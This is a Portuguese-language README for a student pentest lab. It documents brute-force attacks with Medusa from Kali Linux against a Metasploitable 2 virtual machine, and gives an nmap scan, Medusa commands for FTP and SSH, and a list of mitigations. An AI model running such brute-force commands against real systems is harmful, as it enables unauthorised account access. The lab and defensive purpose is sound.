# 🔐 Projeto de Auditoria e Ataques de Força Bruta com Medusa e Kali Linux

Este projeto foi desenvolvido como parte do desafio de segurança ofensiva, utilizando ataques de **força bruta** contra diferentes serviços (FTP, SSH, SMB, HTTP) com o objetivo de entender vulnerabilidades comuns e reforçar o aprendizado em ambientes controlados.

Todo o laboratório foi montado no **VirtualBox**, utilizando:

- 🟢 **Kali Linux** — máquina atacante  
- 🔴 **Metasploitable 2** — máquina vulnerável para prática de pentest  

> ⚠️ Todo o conteúdo deste projeto é **exclusivamente educacional**, realizado em ambiente seguro e isolado.

---

## 📌 Objetivos do Projeto

- Entender ataques de força bruta utilizando Medusa  
- Realizar auditoria de segurança em ambiente controlado  
- Documentar o processo técnico  
- Identificar vulnerabilidades em serviços expostos  
- Propor medidas de mitigação  
- Organizar e publicar documentação no GitHub

---

## 🖥️ Ambiente Utilizado

### **1. VirtualBox**
Ambas as máquinas foram configuradas com rede NAT ou Host-Only para garantir isolamento.

### **2. Kali Linux (Atacante)**
Ferramentas utilizadas:
- Medusa
- Nmap
- Wordlists (users.txt e pass.txt)

### **3. Metasploitable 2 (Alvo)**
Máquina propositalmente vulnerável, contendo serviços inseguros:
- FTP
- SSH
- Telnet
- SMB
- HTTP (DVWA, Mutillidae)

---

## 🔎 Escaneamento Inicial (Nmap)

```
nmap -sV -p 21,22,80,445,139 <IP>
```

---

## 🔨 Ataques de Força Bruta com Medusa

FTP:

```
medusa -h <IP> -U users.txt -P pass.txt -M ftp -t 6
```

SSH:

```
medusa -h <IP> -U users.txt -P passw.txt -M ssh
```

---

## 🖼️ Evidências (Imagens)

As imagens utilizadas durante o laboratório estão na pasta:

```
/images
```

---

## 🛡️ Medidas de Mitigação

- Trocar senhas fracas  
- Desabilitar serviços não utilizados  
- Configurar firewall  
- Atualizar sistemas  
- Bloquear tentativas repetidas  
- Usar MFA

---

## 📂 Estrutura do Repositório

```
├── README.md
├── wordlists/
├── scripts/
└── images/
```

